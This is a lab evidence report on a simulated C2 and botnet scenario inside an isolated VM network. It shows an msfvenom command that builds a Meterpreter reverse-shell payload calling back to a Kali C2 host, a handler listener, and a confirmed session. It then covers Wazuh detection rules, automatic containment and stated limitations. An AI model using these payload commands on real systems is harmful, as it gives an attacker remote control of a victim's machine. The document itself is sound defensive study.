# Threat 3 (C2 / Botnet / APT) — PoC evidence

C2 server: `metasploit-container` (Kali, 10.255.255.81), Metasploit 6.
Victim: `apache-container` (10.255.255.241, Wazuh agent 001).
Date 2026-11-24. **Safety: all traffic on the 10.255.255.0/24 incus bridge, inside the
VM. `payload.sh` refuses any LHOST that is not `10.255.255.x`.**

## Attack chain (guide 8)
1. `payload.sh` → `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.255.255.81
   LPORT=4444 -f elf` → `payload.elf` (x64 to match the Ubuntu victim).
2. `start_handler.sh` → `multi/handler` listening on 10.255.255.81:4444.
3. Payload delivered to the victim's `/root/loot/` and executed.
4. Reverse shell established — Metasploit confirms:
   ```
   [*] Meterpreter session 1 opened (10.255.255.81:4444 -> 10.255.255.241:57178)
   ```

## Detection (Wazuh, two independent angles)

| rule | level | signal | observed |
|---|---|---|---|
| 100301 | 10 | FIM realtime: payload file written to `/root/loot/` | ✓ agent=apache-container |
| 100300 | 12 | command-monitoring: ESTABLISHED TCP connection to the C2 port 4444 | ✓ agent=apache-container |

Rule 100300 keys off Wazuh's full_command parent rule 530; the victim agent runs
`ss -Hntp state established dst :4444` every 15 s and emits `C2CHECK peer=...` when the
reverse shell is live.

## Action-response (automatic containment)
`active-response/c2-contain.sh` (triggered by rule 100300, runs on the victim):
```
2026-11-24 18:52:08 c2-contain: killed pid 4021
2026-11-24 18:52:08 c2-contain: blocked egress tcp/4444
```
Effect: the meterpreter process was killed, egress to tcp/4444 dropped. Re-running the
payload afterwards: `conn_after_block=0` — it can no longer reach the C2.

## Botnet narrative
The DoS load-clients (Threat 1) + this C2 model a botnet: a C2-controlled host launching
the distributed flood that a single per-IP rate limit (Threat 1) cannot fully stop. The
containment here (kill + egress block) is the host-level complement.

## Post-mortem / limitations
- Detection latency ≈ one command-monitor cycle (≤15 s). Shorter cycle = faster detection
  but more overhead/noise.
- `ss dst :4444` keys on the known C2 port; a real adversary would randomise ports / use
  443. A production rule should flag *any* unexpected egress from a server that normally
  has none, or use network-flow baselining — not a fixed port.
- Containment kills the live channel but does not by itself remove persistence (cron,
  systemd, modified binaries). A full IR playbook would add FIM on autostart locations and
  re-image. This is the honest gap (the project rewards stating it).
